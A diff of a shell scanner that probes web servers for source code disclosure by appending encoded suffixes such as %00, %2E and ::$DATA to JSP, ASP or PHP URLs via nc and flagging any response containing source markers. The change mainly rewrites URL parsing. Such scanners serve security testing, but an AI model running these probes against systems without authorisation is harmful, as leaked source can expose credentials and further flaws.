@@ -16,20 +16,18 @@ fi
 PATTERNS='. %2E + %2B %2A \ %5C ? %3F %20 %00 ::$DATA'
 
 URL=$1
-TEMP=`expr "$URL" : 'http:\/\/\(.*\):.*\/'`
-if [ -z $TEMP ]; then
-  # http://host/
-  HOST=`expr "$URL" : 'http:\/\/\(.*\)\/'`
-  PORT=80
-  URL=`expr "$URL" : 'http:\/\/.*/\(.*\)'`
-else
-  # http://host:port/
-  HOST=$TEMP
-  PORT=`expr "$URL" : 'http:\/\/.*:\(.*\)/'`
-  URL=`expr "$URL" : 'http:\/\/.*:.*/\(.*\)'`
-fi
+TEMP=`echo $URL | awk 'BEGIN { FS="/" } { print $3 }'`
+HOST=`echo $TEMP | awk 'BEGIN { FS=":" } { print $1 }'`
+PORT=`echo $TEMP | awk 'BEGIN { FS=":" } { print $2 }'`
+REQ=`echo $URL | awk 'BEGIN { FS="/" } { for (i=4; i<NF; i++) printf("%s/",$i) }'`
+FILENAME=`echo $URL | awk 'BEGIN { FS="/" } { print $NF }'`
+EXT=`echo $FILENAME | awk 'BEGIN { FS="." } { print $NF }'`
 
-EXT=`expr "$URL" : '.*\.\(.*\)'`
+if [ -z $PORT ]
+then
+  PORT=80
+fi
+  
 if [ $EXT = 'jsp' -o $EXT = 'JSP' -o $EXT = 'asp' -o $EXT = 'ASP' ]; then
   SRC='<%'
 else if [ $EXT = 'php' -o $EXT = 'PHP' ]; then
@@ -37,10 +35,12 @@ else if [ $EXT = 'php' -o $EXT = 'PHP' ]; then
   fi
 fi
 
-for PATTERN in $PATTERNS; do
-  RESULT=`echo -e "GET /$URL$PATTERN HTTP/1.0\n\n" | nc $HOST $PORT | grep $SRC`
+for PATTERN in $PATTERNS
+do
+  RESULT=`echo -e "GET /$REQ$FILENAME$PATTERN HTTP/1.0\n\n" | nc $HOST $PORT | grep $SRC`
   STRLEN=`expr "$RESULT" : '.*'`
-  if [ $STRLEN -gt 0 ]; then
-    echo "http://$HOST:$PORT/$URL$PATTERN is vulnerable"
+  if [ $STRLEN -gt 0 ]
+  then
+    echo "http://$HOST:$PORT/$REQ$FILENAME$PATTERN is vulnerable"
   fi
 done
